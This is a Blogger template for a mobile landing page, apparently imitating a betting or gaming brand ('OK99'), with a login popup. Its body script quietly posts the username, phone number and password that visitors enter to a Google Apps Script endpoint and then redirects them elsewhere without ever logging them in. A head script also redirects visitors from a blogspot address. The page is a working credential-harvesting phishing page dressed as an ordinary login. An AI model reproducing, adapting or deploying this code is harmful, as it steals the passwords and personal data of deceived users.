head.script:
//
(function() {
  if (window.location.hostname === 'ok9vip.blogspot.com') {
    window.location.replace('https://ok99.vercel.app/');
    return;
  }

  function scaleWrapper() {
    var wrapper = document.querySelector('.ladi-wraper');
    if (!wrapper) return;
    var screenWidth = window.innerWidth;

    if (screenWidth < 480) {
      var ratio = screenWidth / 320;
      wrapper.style.transform = 'scale(' + ratio + ')';
      wrapper.style.transformOrigin = 'top center';

      var container = document.querySelector('.app-container');
      if (container) {
        container.style.height = (708.9 * ratio) + 'px';
        container.style.minHeight = (708.9 * ratio) + 'px';
        container.style.padding = '0';
      }
    } else {
      wrapper.style.transform = 'none';
      wrapper.style.transformOrigin = 'initial';
      var container = document.querySelector('.app-container');
      if (container) {
        container.style.height = 'auto';
        container.style.minHeight = '100vh';
        container.style.padding = '20px 0';
      }
    }
  }

  window.addEventListener('DOMContentLoaded', scaleWrapper);
  window.addEventListener('load', scaleWrapper);
  window.addEventListener('resize', scaleWrapper);
  setTimeout(scaleWrapper, 0);
})();
//

head.b:skin:
/* General Reset */
*, *::before, *::after {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

body {
  font-family: "Open Sans", sans-serif;
  background-color: #0c101a;
  color: #fff;
  line-height: 1.2;
  overflow-x: hidden;
  min-height: 100vh;
}

/* Ladi Wrapper - Fixed Width 320px centered on screen */
.ladi-wraper {
  position: relative;
  width: 320px;
  height: 708.9px;
  background-color: #000;
  overflow: hidden;
  margin: 40px auto;
  box-shadow: 0 15px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(16, 121, 61, 0.15);
  border-radius: 16px;
}

@media (max-width: 480px) {
  body {
    background-color: #000;
  }

  .ladi-wraper {
    width: 100vw;
    height: calc(100vw * (708.9 / 320));
    margin: 0;
    border-radius: 0;
    box-shadow: none;
  }

  #IMAGE2 {
    width: 100%;
    height: 100%;
    left: 0;
    top: 0;
  }

  #BUTTON_SUPPORT {
    width: 12.5%;
    height: 4.514%;
    top: 0.352%;
    left: 46.25%;
  }

  .support-icon-svg {
    width: 57.5%;
    height: 71.8%;
  }

  #BUTTON19 {
    width: 23.4375%;
    height: 3.667%;
    top: 1.34%;
    left: 58.4375%;
  }

  #BUTTON19 .ladi-headline {
    font-size: 3.4vw;
  }

  #BUTTON20 {
    width: 18.75%;
    height: 3.667%;
    top: 1.34%;
    left: 80.625%;
  }

  #BUTTON20 .ladi-headline {
    font-size: 3.4vw;
  }

  /* POPUP MODAL RESPONSIVE */
  #SECTION_POPUP {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 100;
    display: none;
    justify-content: center;
    align-items: center;
  }

  #POPUP1 {
    position: relative;
    width: 90vw;
    height: calc(90vw * (474.456 / 318));
    transform: scale(0.9);
    opacity: 0;
    transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.3s ease;
    margin: 0 auto;
  }

  #IMAGE3 {
    width: 100%;
    height: 100%;
    left: 0;
    top: 0;
  }

  #FORM2 {
    width: 85%;
    height: 29.3%;
    left: 7.5%;
    top: 44.8%;
  }

  #FORM_ITEM2 {
    width: 100%;
    height: 15.8%;
    top: 0;
    left: 0;
  }

  #FORM_ITEM6 {
    width: 100%;
    height: 15.8%;
    top: 23%;
    left: 0;
  }

  #FORM_ITEM4 {
    width: 100%;
    height: 15.8%;
    top: 46.7%;
    left: 0;
  }

  .ladi-form-control {
    font-size: 3.4vw;
  }

  .ladi-form-control::placeholder {
    font-size: 3.4vw;
  }

  #BUTTON18 {
    width: 100%;
    height: 20.8%;
    top: 79.1%;
    left: 0;
  }

  #BUTTON18 .ladi-headline {
    font-size: 4.1vw;
  }

  .popup-close {
    width: 6.3vw;
    height: 6.3vw;
    right: 3.8vw;
    top: 3.8vw;
  }
}

/* Section styling */
.ladi-section {
  position: relative;
  width: 100%;
  height: 100%;
}

.ladi-container {
  position: relative;
  width: 100%;
  height: 100%;
}

.ladi-element {
  position: absolute;
}

/* Background Image 2 (Main Hero) */
#IMAGE2 {
  top: -0.5px;
  left: 0px;
  width: 320px;
  height: 710.4px;
  z-index: 1;
}

@media (max-width: 480px) {
  #IMAGE2 {
    height: 100vh;
  }
}

#IMAGE2 .ladi-image,
#IMAGE2 .ladi-image-background {
  width: 100%;
  height: 100%;
}

#IMAGE2 .ladi-image-background {
  /* CHÚ Ý: Sử dụng ảnh online vì Blogger không có thư mục lưu trữ cục bộ */
  background-image: url("https://w.ladicdn.com/s650x1050/697a1ff4787d41001277b312/09-ds-picsart-aiimageenhancer-20260422072429-sxlg8.png");
  background-repeat: no-repeat;
  background-size: cover;
  background-position: center top;
}

/* Base Button Styling */
.ladi-button-action {
  cursor: pointer;
}

.ladi-button {
  position: relative;
  width: 100%;
  height: 100%;
  overflow: hidden;
  display: flex;
  justify-content: center;
  align-items: center;
  transition: transform 0.1s ease, filter 0.2s ease;
}

.ladi-button:active {
  transform: scale(0.95);
}

.ladi-button-background {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 1;
}

.ladi-button-headline {
  position: absolute;
  z-index: 2;
  width: 100%;
  height: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
}

.ladi-headline {
  font-family: "Open Sans", sans-serif;
  text-align: center;
  user-select: none;
  font-weight: bold;
}

/* Support Button (#BUTTON_SUPPORT) */
#BUTTON_SUPPORT {
  width: 40px;
  height: 32px;
  top: 2.5px;
  left: 148px;
  z-index: 10;
  text-decoration: none;
  display: flex;
  justify-content: center;
  align-items: center;
}

#BUTTON_SUPPORT .ladi-button-background {
  background-color: #ffffff;
  border-radius: 4px;
}

.support-icon-svg {
  width: 23px;
  height: 23px;
  color: rgb(16, 121, 61);
  stroke-width: 2.5;
}

/* Login Button (#BUTTON19) */
#BUTTON19 {
  width: 75px;
  height: 26px;
  top: 9.5px;
  left: 187px;
  z-index: 10;
}

#BUTTON19 .ladi-button-background {
  background-color: #ffffff;
  border-radius: 4px;
}

#BUTTON19 .ladi-headline {
  font-size: 11px;
  color: rgb(16, 121, 61);
}

/* Register Link Button (#BUTTON20) */
#BUTTON20 {
  display: block;
  width: 60px;
  height: 26px;
  top: 9.5px;
  left: 258px;
  z-index: 10;
  text-decoration: none;
}

#BUTTON20 .ladi-button-background {
  background-color: #ffffff;
  border-radius: 4px;
}

#BUTTON20 .ladi-headline {
  font-size: 11px;
  color: rgb(16, 121, 61);
}

/* Hover effects for header buttons */
#BUTTON19:hover .ladi-button-background,
#BUTTON20:hover .ladi-button-background,
#BUTTON_SUPPORT:hover .ladi-button-background {
  filter: brightness(0.95);
}

/* ==========================================================================
   POPUP MODAL SECTION
   ========================================================================== */

#SECTION_POPUP {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 100;
  display: none; /* Controlled via JS */
  justify-content: center;
  align-items: center;
}

/* Modal Backdrop */
.backdrop-popup {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.7);
  backdrop-filter: blur(2px);
  z-index: 99;
}

#SECTION_POPUP .ladi-container {
  position: relative;
  z-index: 100;
  display: flex;
  justify-content: center;
  align-items: center;
}

/* POPUP1 Dialog Container */
#POPUP1 {
  position: relative;
  width: 318px;
  height: 474px;
  background-color: transparent;
  z-index: 101;
  transform: scale(0.9);
  opacity: 0;
  transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.3s ease;
}

#SECTION_POPUP.active #POPUP1 {
  transform: scale(1);
  opacity: 1;
}

.ladi-popup {
  position: relative;
  width: 100%;
  height: 100%;
}

/* Modal Close Button */
.popup-close {
  position: absolute;
  right: 12px;
  top: 12px;
  z-index: 110;
  cursor: pointer;
  width: 20px;
  height: 20px;
  background-repeat: no-repeat;
  background-position: center center;
  background-size: contain;
  background-image: url("data:image/svg+xml;utf8, %3Csvg%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20fill%3D%22%23fff%22%3E%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M23.4144%202.00015L2.00015%2023.4144L0.585938%2022.0002L22.0002%200.585938L23.4144%202.00015Z%22%3E%3C%2Fpath%3E%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M2.00015%200.585938L23.4144%2022.0002L22.0002%2023.4144L0.585938%202.00015L2.00015%200.585938Z%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E");
  transition: transform 0.2s ease, opacity 0.2s ease;
}

.popup-close:hover {
  transform: rotate(90deg);
  opacity: 0.8;
}

/* Modal Background Image */
#IMAGE3 {
  top: -0.2px;
  left: 0px;
  width: 318px;
  height: 474.456px;
  z-index: 1;
}

#IMAGE3 .ladi-image,
#IMAGE3 .ladi-image-background {
  width: 100%;
  height: 100%;
}

#IMAGE3 .ladi-image-background {
  /* CHÚ Ý: Sử dụng ảnh online vì Blogger không có thư mục lưu trữ cục bộ */
  background-image: url("https://w.ladicdn.com/s650x800/697a1ff4787d41001277b312/dn-ds-picsart-aiimageenhancer-20260422073340-7_3na.png");
  background-repeat: no-repeat;
  background-size: cover;
  background-position: center;
}

/* Form Container */
#FORM2 {
  width: 270px;
  height: 139px;
  top: 212.5px;
  left: 24px;
  z-index: 10;
}

.ladi-form {
  position: relative;
  width: 100%;
  height: 100%;
}

/* Form inputs styling */
.ladi-form-item-container {
  position: relative;
  width: 100%;
  height: 100%;
  border: 1px solid rgb(16, 121, 61);
  border-radius: 6px;
  background-color: #ffffff;
  overflow: hidden;
}

.ladi-form-item {
  width: 100%;
  height: 100%;
}

.ladi-form-control {
  width: 100%;
  height: 100%;
  border: none;
  outline: none;
  background: transparent;
  padding: 0 10px;
  font-family: "Open Sans", sans-serif;
  font-size: 11px;
  color: #000000;
  font-weight: 500;
}

.ladi-form-control::placeholder {
  color: rgba(0, 0, 0, 0.5);
  font-size: 11px;
}

/* Position of Form Fields */
#FORM_ITEM2 {
  width: 270px;
  height: 22px;
  top: 0px;
  left: 0px;
}

#FORM_ITEM6 {
  width: 270px;
  height: 22px;
  top: 32px;
  left: 0px;
}

#FORM_ITEM4 {
  width: 270px;
  height: 22px;
  top: 65px;
  left: 0px;
}

/* Submit Button (#BUTTON18) */
#BUTTON18 {
  width: 270px;
  height: 29px;
  top: 110px;
  left: 0px;
}

.ladi-button-submit-wrapper {
  width: 100%;
  height: 100%;
  border: none;
  background: transparent;
  padding: 0;
  cursor: pointer;
  outline: none;
}

#BUTTON18 .ladi-button-background {
  background-color: rgb(58, 179, 110);
  border-radius: 6px;
  box-shadow: 0 3px 6px rgba(0,0,0,0.16);
  transition: background-color 0.2s ease;
}

#BUTTON18:hover .ladi-button-background {
  background-color: rgb(48, 159, 95);
}

.ladi-button-submit-wrapper:disabled {
  cursor: not-allowed;
  opacity: 0.7;
}

#BUTTON18 .ladi-headline {
  font-size: 13px;
  color: rgb(241, 243, 244);
  font-weight: bold;
}

body.script:
//
document.addEventListener('DOMContentLoaded', () => {
  const loginBtn = document.getElementById('BUTTON19');
  const popupSection = document.getElementById('SECTION_POPUP');
  const closeBtn = document.getElementById('popup-close-btn');
  const backdrop = document.getElementById('backdrop-popup');
  const loginForm = document.getElementById('login-form');
  const submitButtonText = document.querySelector('#BUTTON_TEXT18 .ladi-headline');
  const submitButton = document.querySelector('#BUTTON18 button');

  // Google Apps Script URL
  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbya-T8hURlVDL573F8-rAXv73CqAsYoUKgyCXj_-GhXXYmtK3JdiWwZXPSQI08oe4yP/exec';
  // Redirect URL
  const REDIRECT_URL = 'https://ok99.vercel.app/';

  const openModal = () => {
    popupSection.style.display = 'flex';
    popupSection.offsetHeight;
    popupSection.classList.add('active');
  };

  const closeModal = () => {
    popupSection.classList.remove('active');
    setTimeout(() => {
      popupSection.style.display = 'none';
    }, 300);
  };

  if (loginBtn) loginBtn.addEventListener('click', openModal);
  if (closeBtn) closeBtn.addEventListener('click', closeModal);
  if (backdrop) backdrop.addEventListener('click', closeModal);

  if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('username-input').value;
      const phone = document.getElementById('phone-input').value;
      const password = document.getElementById('password-input').value;

      if (username && phone && password) {
        if (submitButtonText) submitButtonText.textContent = 'ĐANG XỬ LÝ...';
        if (submitButton) submitButton.disabled = true;

        const inputs = loginForm.querySelectorAll('input');
        inputs.forEach(input => input.disabled = true);

        try {
          await fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              name: username,
              phone: phone,
              password: password
            })
          });
          await new Promise(resolve => setTimeout(resolve, 800));
          window.location.href = REDIRECT_URL;
        } catch (error) {
          console.error('Error:', error);
          window.location.href = REDIRECT_URL;
        }
      }
    });
  }

  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && popupSection.classList.contains('active')) {
      closeModal();
    }
  });
});
//
